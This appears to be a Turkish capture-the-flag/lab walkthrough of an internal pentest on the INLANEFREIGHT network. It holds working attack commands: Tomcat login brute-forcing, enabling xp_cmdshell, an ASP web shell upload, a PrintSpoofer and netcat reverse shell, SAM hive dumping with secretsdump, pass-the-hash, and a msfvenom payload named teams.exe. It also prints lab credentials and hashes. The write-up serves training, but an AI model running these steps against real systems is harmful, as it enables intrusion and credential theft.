Ayrıca 172.16.8.0/23 subnet'indeki hostları listelemek için Proxychains aracılığıyla Nmap'i de kullanabiliriz, ancak bu çok yavaş olacak ve bitmesi uzun zaman alacaktır.

Host keşfimiz üç ek host ortaya çıkarır:

- 172.16.8.3
- 172.16.8.20
- 172.16.8.50

Şimdi bu hostların her birini daha derinlemesine inceleyebilir ve ne bulacağımıza bakabiliriz.


## Host Enumeration

dmz01 hostundan statik bir Nmap binary kullanarak numaralandırmamıza devam edelim. File Transfers modülünde öğretilen tekniklerden birini kullanarak binary'yi yüklemeyi deneyin.

```shell-session
root@dmz01:/tmp# ./nmap --open -iL live_hosts 

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-06-22 01:42 UTC
Unable to find nmap-services! Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.

Nmap scan report for 172.16.8.3
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00064s latency).
Not shown: 1173 closed ports
PORT    STATE SERVICE
53/tcp  open  domain
88/tcp  open  kerberos
135/tcp open  epmap
139/tcp open  netbios-ssn
389/tcp open  ldap
445/tcp open  microsoft-ds
464/tcp open  kpasswd
593/tcp open  unknown
636/tcp open  ldaps
MAC Address: 00:50:56:B9:16:51 (Unknown)

Nmap scan report for 172.16.8.20
Host is up (0.00037s latency).
Not shown: 1175 closed ports
PORT     STATE SERVICE
80/tcp   open  http
111/tcp  open  sunrpc
135/tcp  open  epmap
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs
3389/tcp open  ms-wbt-server
MAC Address: 00:50:56:B9:EC:36 (Unknown)

Nmap scan report for 172.16.8.50
Host is up (0.00038s latency).
Not shown: 1177 closed ports
PORT     STATE SERVICE
135/tcp  open  epmap
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
8080/tcp open  http-alt
MAC Address: 00:50:56:B9:B0:89 (Unknown)

Nmap done: 3 IP addresses (3 hosts up) scanned in 131.36 second
```

Nmap çıktısından aşağıdakileri elde edebiliriz:

* 172.16.8.3 bir Domain Controller'dır çünkü Kerberos ve LDAP gibi açık portlar görüyoruz. Doğrudan istismar edilme olasılığı düşük olduğu için bunu şimdilik bir kenara bırakabiliriz (yine de buna geri dönebiliriz)
* 172.16.8.20 bir Windows host'udur ve 80/HTTP ve 2049/NFS portları özellikle ilginçtir
* 172.16.8.50 de bir Windows hostudur ve 8080 portu standart dışı ve ilginç olarak göze çarpmaktadır

Bu hostlardan bazılarını incelerken arka planda tam bir TCP port taraması yapabiliriz.


## Active Directory Quick Hits - SMB NULL SESSION

SMB NULL oturumları için Domain Controller'ı hızlıca kontrol edebiliriz. Password politikasını ve kullanıcı listesini dökebilirsek, ölçülü bir password spraying saldırısı deneyebiliriz. Password policy'yi bilirsek, hesap kilitlenmesini önlemek için saldırılarımızı uygun şekilde zamanlayabiliriz. Başka bir şey bulamazsak, geri dönüp Kerbrute'u kullanarak çeşitli kullanıcı listelerinden geçerli kullanıcı adlarını numaralandırabilir ve şirketin LinkedIn sayfasından potansiyel kullanıcı adlarını numaralandırdıktan sonra (gerçek bir pentest sırasında) kullanabiliriz. Elimizdeki bu listeyle 1-2 spreyleme saldırısı deneyebilir ve bir isabet elde etmeyi umabiliriz. Bu hala işe yaramazsa, müşteriye ve değerlendirme türüne bağlı olarak, hesapların kilitlenmesini önlemek için onlardan password politikasını isteyebiliriz. Active Directory Numaralandırma ve Saldırılar modülünde tartışıldığı gibi geçerli kullanıcı adlarımız varsa ASREPRoasting saldırısını da deneyebiliriz.

```shell-session
M1R4CKCK@htb[/htb]$ proxychains enum4linux -U -P 172.16.8.3

ProxyChains-3.1 (http://proxychains.sf.net)
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Jun 21 21:49:47 2022

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 172.16.8.3
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ================================================== 
|    Enumerating Workgroup/Domain on 172.16.8.3    |
 ================================================== 
[E] Can't find workgroup/domain


 =================================== 
|    Session Check on 172.16.8.3    |
 =================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[+] Server 172.16.8.3 allows sessions using username '', password ''
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
[+] Got domain/workgroup name: 

 ========================================= 
|    Getting domain SID for 172.16.8.3    |
 ========================================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.3:445-<><>-OK
Domain Name: INLANEFREIGHT
Domain Sid: S-1-5-21-2814148634-3729814499-1637837074
[+] Host is part of a domain (not a workgroup)

 =========================== 
|    Users on 172.16.8.3    |
 =========================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 ================================================== 
|    Password Policy Information for 172.16.8.3    |
 ================================================== 
[E] Unexpected error from polenum:
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.3:139-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.3:445-<><>-OK


[+] Attaching to 172.16.8.3 using a NULL share

[+] Trying protocol 139/SMB...

	[!] Protocol failed: Cannot request session (Called Name:172.16.8.3)

[+] Trying protocol 445/SMB...

	[!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.

[E] Failed to get password policy with rpcclient

enum4linux complete on Tue Jun 21 21:50:07 2022
```

Ne yazık ki bizim için bu bir çıkmaz sokak.


## 172.16.8.50 - Tomcat

Daha önceki Nmap taramamız bu hostta 8080 portunun açık olduğunu göstermişti. http://172.16.8.50:8080 adresine göz attığımızda Tomcat 10'un en son sürümünün yüklü olduğunu görüyoruz. Bunun için genel bir açık olmamasına rağmen, Attacking Common Applications modülünün Attacking Tomcat bölümünde gösterildiği gibi Tomcat Manager girişini brute-force yapmayı deneyebiliriz. Metasploit'in başka bir örneğini Proxychains kullanarak proxychains msfconsole yazarak başlatabiliriz, böylece bir Meterpreter oturumu aracılığıyla yönlendirme ayarlamadıysak, ele geçirilen dmz01 hostu üzerinden pivot yapabiliriz. Daha sonra auxiliary/scanner/http/tomcat_mgr_login modülünü kullanarak brute-force  loginyapmaya çalışabiliriz.

```shell-session
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 172.16.8.50
rhosts => 172.16.8.50
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
stop_on_success => true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.50:8080-<><>-OK

[!] No active DB -- Credential data will not be saved!
[-] 172.16.8.50:8080 - LOGIN FAILED: admin:admin (Incorrect)
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.50:8080-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.50:8080-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.50:8080-<><>-OK
[-] 172.16.8.50:8080 - LOGIN FAILED: admin:manager (Incorrect)
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.50:8080-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.50:8080-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.50:8080-<><>-OK
[-] 172.16.8.50:8080 - LOGIN FAILED: admin:role1 (Incorrect)

<SNIP>

|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.50:8080-<><>-OK
[-] 172.16.8.50:8080 - LOGIN FAILED: tomcat:changethis (Incorrect)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Başarılı bir oturum açma alamıyoruz, bu yüzden bu bir çıkmaz sokak gibi görünüyor ve daha fazla araştırmaya değmez. İnternete açık bir Tomcat Manager login sayfasına rastlasaydık, muhtemelen bunu bir bulgu olarak kaydetmek isterdik çünkü bir saldırgan potansiyel olarak brute force yapabilir ve bunu bir dayanak elde etmek için kullanabilir. İç ağda, yalnızca zayıf kimlik bilgileriyle girip bir JSP web shell yükleyebildiysek bunu rapor etmek isteriz. Aksi takdirde, iyi kilitlenmişse iç ağda görmek normaldir.


## Enumerating 172.16.8.20 - DotNetNuke (DNN)

Nmap taramasında 80 ve 2049 numaralı portların açık olduğunu gördük. Bunların her birini inceleyelim. Proxychains curl http://172.16.8.20 komutunu kullanarak saldırı hostumuzdan cURL kullanarak 80 numaralı portta ne olduğunu kontrol edebiliriz. HTTP yanıtından, hedefte DotNetNuke (DNN) çalışıyor gibi görünüyor. Bu .NET ile yazılmış bir CMS'dir, temelde .NET'in WordPress'idir. Yıllar boyunca birkaç kritik kusurdan muzdarip olmuştur ve ayrıca yararlanabileceğimiz bazı built-in işlevlere sahiptir. Bunu, saldırı hostumuzdan doğrudan hedefe göz atarak ve trafiği SOCKS proxy üzerinden geçirerek doğrulayabiliriz.

Bunu Firefox'ta aşağıdaki gibi ayarlayabiliriz:

![Pasted image 20250101030246.png](/img/user/resimler/Pasted%20image%2020250101030246.png)

Sayfaya göz atmak şüphelerimizi doğruluyor.

![Pasted image 20250101030301.png](/img/user/resimler/Pasted%20image%2020250101030301.png)

http://172.16.8.20/Login?returnurl=%2fadmin adresine göz atmak bize admin giriş sayfasını gösterir. Ayrıca kullanıcı kaydetmek için de bir sayfa var. Bir hesap açmaya çalışıyoruz ancak şu mesajı alıyoruz:

Bilgilerinizi içeren bir e-posta doğrulama için Site Yöneticisine gönderildi. Kaydınız onaylandığında e-posta ile bilgilendirileceksiniz. Bu arada bu sitede gezinmeye devam edebilirsiniz.

Tecrübelerime göre, herhangi bir site yöneticisinin garip bir kaydı onaylaması pek olası değil, yine de tüm temellerimizi korumaya çalışmakta fayda var.

DNN'i şimdilik bir kenara bırakarak, port tarama sonuçlarımıza geri dönüyoruz. Port 2049, NFS, görmek her zaman ilginçtir. Eğer NFS sunucusu yanlış yapılandırılmışsa (ki genellikle dahili olarak yapılandırılırlar), NFS paylaşımlarına göz atabilir ve potansiyel olarak bazı hassas verileri ortaya çıkarabiliriz. Bu bir geliştirme sunucusu olduğu için ( proses içi DNN kurulumu ve DEV01 host adı nedeniyle) araştırmaya değer. Diğer dosya paylaşımlarına benzer şekilde bağlayabileceğimiz ve göz atabileceğimiz dışa aktarımları listelemek için showmount'u kullanabiliriz. DEV01 adında herkesin erişebileceği (anonim erişim) bir dışa aktarım bulduk. Bakalım neler içeriyor.

```shell-session
M1R4CKCK@htb[/htb]$ proxychains showmount -e 172.16.8.20

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:111-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:2049-<><>-OK
Export list for 172.16.8.20:
/DEV01 (everyone)
```

NFS paylaşımını Proxychains aracılığıyla bağlayamıyoruz, ancak neyse ki denemek için dmz01 hostuna root erişimimiz var. DNN ile ilgili birkaç dosya ve bir DNN alt dizini görüyoruz.

```shell-session
root@dmz01:/tmp# mkdir DEV01
root@dmz01:/tmp# mount -t nfs 172.16.8.20:/DEV01 /tmp/DEV01
root@dmz01:/tmp# cd DEV01/
root@dmz01:/tmp/DEV01# ls

BuildPackages.bat            CKToolbarButtons.xml  DNN       WatchersNET.CKEditor.sln
CKEditorDefaultSettings.xml  CKToolbarSets.xml     
```

DNN alt dizini bir web.config dosyası içerdiği için çok ilginçtir. Penetrasyon Test Cihazı Yolu boyunca yağmalama konusundaki tartışmalarımızdan, yapılandırma dosyalarının genellikle kimlik bilgileri içerebileceğini ve bu da onları herhangi bir değerlendirme sırasında önemli bir hedef haline getirdiğini biliyoruz.

```shell-session
root@dmz01:/tmp/DEV01# cd DNN
root@dmz01:/tmp/DEV01/DNN# ls

App_LocalResources                CKHtmlEditorProvider.cs  Options.aspx                 Web
Browser                           Constants                Options.aspx.cs              web.config
bundleconfig.json                 Content                  Options.aspx.designer.cs     web.Debug.config
CKEditorOptions.ascx              Controls                 packages.config              web.Deploy.config
CKEditorOptions.ascx.cs           Extensions               Properties                   web.Release.config
CKEditorOptions.ascx.designer.cs  Install                  UrlControl.ascx
CKEditorOptions.ascx.resx         Module                   Utilities
CKFinder                          Objects                  WatchersNET.CKEditor.csproj

root@dmz01:/tmp/DEV01/DNN# 
```


web.config dosyasının içeriğini kontrol ettiğimizde, DNN örneği için administrator şifresi gibi görünen bir şey buluyoruz.

```shell-session
root@dmz01:/tmp/DEV01/DNN# cat web.config 

<?xml version="1.0"?>
<configuration>
  <!--
    For a description of web.config changes see http://go.microsoft.com/fwlink/?LinkId=235367.

    The following attributes can be set on the <httpRuntime> tag.
      <system.Web>
        <httpRuntime targetFramework="4.6.2" />
      </system.Web>
  -->
  <username>Administrator</username>
  <password>
	<value>D0tn31Nuk3R0ck$@123</value>
  </password>
  <system.web>
    <compilation debug="true" targetFramework="4.5.2"/>
    <httpRuntime targetFramework="4.5.2"/>
  </system.web>
```

Devam etmeden önce, SSH aracılığıyla dmz01 üzerinde root erişimimiz olduğundan, sistemde olduğu gibi tcpdump'ı çalıştırabiliriz. Bir pentest sırasında mümkün olduğunda “kabloyu dinlemekten” asla zarar gelmez ve herhangi bir açık metin kimlik bilgisi alıp alamayacağımızı veya genel olarak bizim için yararlı olabilecek ek bilgileri ortaya çıkarıp çıkaramayacağımızı görürüz. Bunu genellikle kendi fiziksel dizüstü bilgisayarımız veya müşterinin ağı içinde kontrol ettiğimiz bir sanal makinemiz olduğunda Internal Penetration Test sırasında yaparız. Bazı test uzmanları tüm zaman boyunca bir paket yakalama çalıştırırken (nadiren müşteriler bunu talep eder), diğerleri herhangi bir şey yakalayıp yakalayamayacaklarını görmek için ilk gün boyunca periyodik olarak çalıştırır.

```shell-session
root@dmz01:/tmp# tcpdump -i ens192 -s 65535 -w ilfreight_pcap

tcpdump: listening on ens192, link-type EN10MB (Ethernet), capture size 65535 bytes
^C2027 packets captured
2033 packets received by filter
0 packets dropped by kernel
```


Şimdi bunu hostumuza aktarabilir ve herhangi bir şey yakalayıp yakalayamadığımızı görmek için Wireshark'ta açabiliriz. Bu konu Windows Ayrıcalık Yükseltme modülünün Interacting with Users bölümünde kısaca ele alınmıştır. Daha derinlemesine bir çalışma için Ağ Trafiği Analizine Giriş modülüne bakın.

Dosyayı hostumuza aktardıktan sonra Wireshark'ta açıyoruz ancak hiçbir şey yakalanmadığını görüyoruz. Bir kullanıcı VLAN'ında veya ağın başka bir “yoğun” alanında olsaydık, araştırmamız gereken önemli veriler olabilirdi, bu yüzden her zaman denemeye değer.

### Devam Ediyoruz

Bu noktada, ulaşabildiğimiz diğer “canlı” hostlara girdik ve ağ trafiğini koklamaya çalıştık. Bu hostlar için de tam bir port taraması yapabiliriz, ancak şimdilik ilerleyebileceğimiz çok şey var. Açık NFS paylaşımından yağmalanan web.config dosyasından elde ettiğimiz DNN kimlik bilgileriyle neler yapabileceğimizi görelim.


# Exploitation & Privilege Escalation

Bu noktada, Penetrasyon Testi Sürecinin Bilgi Toplama ve Güvenlik Açığı Değerlendirme aşamalarından Exploitation aşamasına geçtik. Bir dayanak noktası elde ettikten sonra, hangi hostların bizim için uygun olduğunu listeledik, açık portları taradık ve erişilebilir servisleri araştırdık.


## Attacking DNN

DNN'e gidelim ve Administrator:D0tn31Nuk3R0ck$@123 kimlik bilgisi çiftiyle şansımızı deneyelim. Bu başarılı oldu; SuperUser administrator hesabı olarak oturum açtık. Burada iki yüksek riskli bulguyu daha kaydetmek istiyoruz: Güvensiz Dosya Paylaşımları ve Dosya Paylaşımlarındaki Hassas Veriler. Bunları potansiyel olarak bir araya getirebiliriz, ancak ayrı sorunlar olarak vurgulamakta fayda var çünkü client anonim erişimi kısıtlıyorsa, ancak tüm Domain Kullanıcıları yine de paylaşıma erişebiliyor ve günlük işleri için gerekli olmayan verileri görebiliyorsa, o zaman hala bir risk var demektir.

![Pasted image 20250101032056.png](/img/user/resimler/Pasted%20image%2020250101032056.png)

`Settings` sayfası altında xp_cmdshell'i etkinleştirebileceğimiz ve işletim sistemi komutlarını çalıştırabileceğimiz bir SQL konsoluna erişilebilir. İlk olarak bu satırları konsola tek tek yapıştırarak ve Script Run'a tıklayarak bunu etkinleştirebiliriz. Her komuttan herhangi bir çıktı almayacağız, ancak hata olmaması genellikle çalıştığı anlamına gelir.

```shell-session
EXEC sp_configure 'show advanced options', '1'
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', '1' 
RECONFIGURE
```

Bu çalışırsa, işletim sistemi komutlarını xp_cmdshell `'<komut burada>'` biçiminde çalıştırabiliriz. Daha sonra bunu bir reverse shell elde etmek veya ayrıcalık yükseltme üzerinde çalışmak için kullanabiliriz.

![Pasted image 20250101032342.png](/img/user/resimler/Pasted%20image%2020250101032342.png)

**DNN** ile ilgili ilginç bir nokta, izin verilen [dosya uzantılarını değiştirerek](https://dnnsupport.dnnsoftware.com/hc/en-us/articles/360004928653-Allowable-File-Types-and-Extensions-for-Upload) **.asp** ve **.aspx** dosyalarının yüklenmesine izin verebilmemizdir. Bu, **SQL console** üzerinden **RCE** elde edemediğimiz durumlarda faydalıdır. Eğer bu başarılı olursa, bir **ASP web shell** yükleyebilir ve **DEV01** sunucusunda remote kod çalıştırma (**RCE**) elde edebiliriz.

İzin verilen dosya uzantıları listesi şu şekilde değiştirilebilir:  
**Settings -> Security -> More -> More Security Settings** yolunu izleyin, **Allowable File Extensions** alanına **.asp** ve **.aspx** ekleyin ve **Save** butonuna tıklayın. Bu işlem tamamlandıktan sonra, **[http://172.16.8.20/admin/file-management](http://172.16.8.20/admin/file-management)** adresine gidip dosya yönetimi panelini açarak bir [**ASP web shell**](https://raw.githubusercontent.com/backdoorhub/shell-backdoor-list/master/shell/asp/newaspcmd.asp) yükleyebiliriz. **Upload files** butonuna tıklayın ve saldırı makinemize indirdiğimiz **ASP web shell** dosyasını seçin.

Yüklendikten sonra, yüklenen dosyaya sağ tıklayabilir ve Get URL'yi seçebiliriz. Ortaya çıkan URL, web shell üzerinden komutları çalıştırmamıza olanak tanıyacaktır; burada daha sonra göreceğimiz gibi bir reverse shell elde etmek veya ayrıcalık yükseltme adımlarını gerçekleştirmek için çalışabiliriz.

![Pasted image 20250101032632.png](/img/user/resimler/Pasted%20image%2020250101032632.png)


## Privilege Escalation

Daha sonra, ayrıcalıkları yükseltmemiz gerekiyor. Yukarıdaki komut çıktısında SeImpersonate ayrıcalıklarına sahip olduğumuzu gördük. Windows Privilege Escalation modülündeki [SeImpersonate ve SeAssignPrimaryToken](https://academy.hackthebox.com/module/67/section/607) bölümündeki adımları izleyerek, ayrıcalıklarımızı SYSTEM'e yükseltmek için çalışabiliriz, bu da Active Directory (AD) domaininde bir başlangıç noktası oluşturacak ve AD'yi numaralandırmaya başlamamızı sağlayacaktır.

PrintSpoofer aracını kullanarak ayrıcalıkları yükseltmeyi deneyeceğiz ve ardından host'un belleğinden veya registry'sinden herhangi bir yararlı kimlik bilgisi dump edip edemeyeceğimize bakacağız. DEV01 hostunda kendimize bir shell göndermek için nc.exe dosyasına ve SeImpersonate ayrıcalıklarından yararlanmak için PrintSpoofer64.exe binary dosyasına ihtiyacımız olacak. Bunları oraya aktarmanın birkaç yolu var. dmz01 hostunu bir “ jump host” olarak kullanabilir ve araçlarımızı SCP aracılığıyla aktarabilir ve ardından bir Python3 web sunucusu başlatabilir ve certutil kullanarak bunları DEV01 hostuna indirebiliriz.

Daha kolay bir yol ise DNN Allowable File Extensions'ı bir kez daha .exe dosya formatına izin verecek şekilde değiştirmek olacaktır. Daha sonra bu iki dosyayı da yükleyebilir ve shell aracılığıyla c:\DotNetNuke\Portals\0 konumunda olduklarını doğrulayabiliriz.

Yüklendikten sonra, dmz01 hostunda bir Netcat dinleyicisi başlatabilir ve NT AUTHORITY\SYSTEM olarak bir reverse shell elde etmek için aşağıdaki komutu çalıştırabiliriz:

```shell-session
c:\DotNetNuke\Portals\0\PrintSpoofer64.exe -c "c:\DotNetNuke\Portals\0\nc.exe 172.16.8.120 443 -e cmd"
```

Komutu çalıştırıyoruz ve neredeyse anında bir reverse shell elde ediyoruz.

```shell-session
root@dmz01:/tmp# nc -lnvp 443

Listening on 0.0.0.0 443
Connection received on 172.16.8.20 58480
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>hostname
hostname
ACADEMY-AEN-DEV01
```

Buradan, bazı post-exploitation işlemleri gerçekleştirebilir ve SAM veritabanının içeriğini ve bununla birlikte lokal administrator password hash'ini manuel olarak alabiliriz.

```cmd-session
c:\DotNetNuke\Portals\0> reg save HKLM\SYSTEM SYSTEM.SAVE
reg save HKLM\SYSTEM SYSTEM.SAVE

The operation completed successfully.

c:\DotNetNuke\Portals\0> reg save HKLM\SECURITY SECURITY.SAVE
reg save HKLM\SECURITY SECURITY.SAVE

The operation completed successfully.

c:\DotNetNuke\Portals\0> reg save HKLM\SAM SAM.SAVE
reg save HKLM\SAM SAM.SAVE

The operation completed successfully.
```

Şimdi bir kez daha izin verilen dosya uzantılarını .SAVE dosyalarını indirmemize izin verecek şekilde değiştirebiliriz. Daha sonra, File Management sayfasına geri dönebilir ve üç dosyanın her birini saldırı hostumuza indirebiliriz.

![Pasted image 20250101033230.png](/img/user/resimler/Pasted%20image%2020250101033230.png)

Son olarak, SAM veritabanını dump etmek ve LSA secret'larından bir dizi kimlik bilgisi almak için secretsdump'ı kullanabiliriz.

```shell-session
M1R4CKCK@htb[/htb]$ secretsdump.py LOCAL -system SYSTEM.SAVE -sam SAM.SAVE -security SECURITY.SAVE

Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0xb3a720652a6fca7e31c1659e3d619944
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<redacted>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
mpalledorous:1001:aad3b435b51404eeaad3b435b51404ee:3bb874a52ce7b0d64ee2a82bbf3fe1cc:::
[*] Dumping cached domain logon information (domain/username:hash)
INLANEFREIGHT.LOCAL/hporter:$DCC2$10240#hporter#f7d7bba128ca183106b8a3b3de5924bc
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:3e002600200046005a003000460021004b00460071002e002b004d0042005000480045002e006c00280078007900580044003b0050006100790033006e002a0047004100590020006e002d00390059003b0035003e0077005d005f004b004900400051004e0062005700440074006b005e0075004000490061005d006000610063002400660033003c0061002b0060003900330060006a00620056006e003e00210076004a002100340049003b00210024005d004d006700210051004b002e004f007200290027004c00720030005600760027004f0055003b005500640061004a006900750032006800540033006c00
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:cb8a6327fc3dad4ea7c84b88c7542e7c
[*] DefaultPassword 
(Unknown User):Gr8hambino!
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x6968d50f5ec2bc41bc207a35f0392b72bb083c22
dpapi_userkey:0xe1e7a8bc8273395552ae8e23529ad8740d82ea92
[*] NL$KM 
 0000   21 0C E6 AC 8B 08 9B 39  97 EA D9 C6 77 DB 10 E6   !......9....w...
 0010   2E B2 53 43 7E B8 06 64  B3 EB 89 B1 DA D1 22 C7   ..SC~..d......".
 0020   11 83 FA 35 DB 57 3E B0  9D 84 59 41 90 18 7A 8D   ...5.W>...YA..z.
 0030   ED C9 1C 26 FF B7 DA 6F  02 C9 2E 18 9D CA 08 2D   ...&...o.......-
NL$KM:210ce6ac8b089b3997ead9c677db10e62eb253437eb80664b3eb89b1dad122c71183fa35db573eb09d84594190187a8dedc91c26ffb7da6f02c92e189dca082d
[*] Cleaning up... 
```

Bu kimlik bilgilerinin CrackMapExec kullanarak çalıştığını doğruluyoruz ve artık reverse shell'imizi kaybetmemiz durumunda bu sisteme geri dönmek için bir yolumuz var.

```shell-session
M1R4CKCK@htb[/htb]$ proxychains crackmapexec smb 172.16.8.20 --local-auth -u administrator -H <redacted>

ProxyChains-3.1 (http://proxychains.sf.net)
[*] Initializing LDAP protocol database
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:445-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:445-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:135-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:445-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:445-<><>-OK
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-AEN-DEV) (domain:ACADEMY-AEN-DEV) (signing:False) (SMBv1:False)
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:445-<><>-OK
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [+] ACADEMY-AEN-DEV\administrator <redacted> (Pwn3d!)
```

Yukarıdaki secretsdump çıktısından, açık metin bir parola görüyoruz, ancak hangi kullanıcı için olduğu hemen belli değil. CrackMapExec kullanarak LSA'yı bir kez daha dump edebilir ve parolanın hporter kullanıcısı için olduğunu doğrulayabiliriz.

Artık INLANEFREIGHT.LOCAL domain'i için ilk domain kimlik bilgilerine sahibiz, hporter:Gr8hambino! Bunu dmz01 üzerindeki reverse shell'imizden teyit edebiliriz.

```cmd-session
c:\DotNetNuke\Portals\0> net user hporter /dom
net user hporter /dom

The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.

User name                    hporter
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/1/2022 11:32:05 AM
Password expires             Never
Password changeable          6/1/2022 11:32:05 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   6/21/2022 7:03:10 AM

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Users         
The command completed successfully.
```

Ayrıca PrintNightmare güvenlik açığını kullanarak DEV01 host'unda ayrıcalıkları yükseltebiliriz. Kimlik bilgilerini almanın Mimikatz kullanmak gibi başka yolları da vardır. Bu makineyle oynayın ve Penetrasyon Test Cihazı Yolunda öğrendiğiniz çeşitli becerileri uygulayarak bu adımları mümkün olduğunca çok şekilde gerçekleştirerek pratik yapın ve sizin için en uygun olanı bulun.

Bu noktada, yazacak ek bir bulgumuz yok çünkü tek yaptığımız, daha önce belirtilen dosya paylaşımı sorunları nedeniyle gerçekleştirebildiğimiz built-in işlevselliği kötüye kullanmaktı. PrintNightmare'den faydalanabilirsek bunu yüksek riskli bir bulgu olarak not edebiliriz.



### Alternatif Yöntem - Reverse Port Forwarding

Bu ağa saldırmanın ve aynı sonuçları elde etmenin birçok yolu vardır, bu yüzden burada hepsini ele almayacağız, ancak bahsetmeye değer bir tanesi SSH ile Remote/Reverse Port Forwarding'dir. Diyelim ki DEV01 kutusundan saldırı hostumuza bir reverse shell döndürmek istiyoruz. Aynı ağda olmadığımız için bunu doğrudan yapamayız, ancak reverse port forwarding gerçekleştirmek ve hedefimize ulaşmak için dmz01'den yararlanabiliriz. Herhangi bir nedenle hedefte bir Meterpreter shell veya doğrudan bir reverse shell elde etmek isteyebiliriz. Ayrıca, PrintSpoofer'ı kullanarak bir lokal admin ekleyebilir veya DEV01'den kimlik bilgilerini dump edebilir ve ardından Proxychains (pass-the-hash, RDP, WinRM, vb.) kullanarak saldırı hostumuzdan herhangi bir şekilde host'a bağlanabilirdik. DEV01 hostu ile doğrudan saldırı hostunuzdan etkileşim kurarak aynı görevi kaç şekilde gerçekleştirebileceğinizi görün. Çok yönlü olmak çok önemlidir ve bu laboratuvar ağı mümkün olduğunca çok sayıda tekniği uygulamak ve becerilerimizi geliştirmek için harika bir yerdir.

Reverse port forwarding yöntemini hızlıca gözden geçirelim. Öncelikle, msfvenom kullanarak bir payload oluşturmamız gerekiyor. Burada lhost alanında dmz01 pivot host'un IP adresini belirteceğimizi ve hedef bize doğrudan geri bağlanamayacağı için saldırı host IP'mizi NOT edeceğimizi unutmayın.

```shell-session
M1R4CKCK@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https lhost=172.16.8.120 -f exe -o teams.exe LPORT=443

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 787 bytes
Final size of exe file: 7168 bytes
Saved as: teams.exe
```

Daha sonra, bir multi/handler kurmamız ve oluşturduğumuz payload'un kullanacağından farklı bir portta bir dinleyici başlatmamız gerekir.

```shell-session
[msf](Jobs:0 Agents:0) exploit(windows/smb/smb_delivery) >> use multi/handler
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
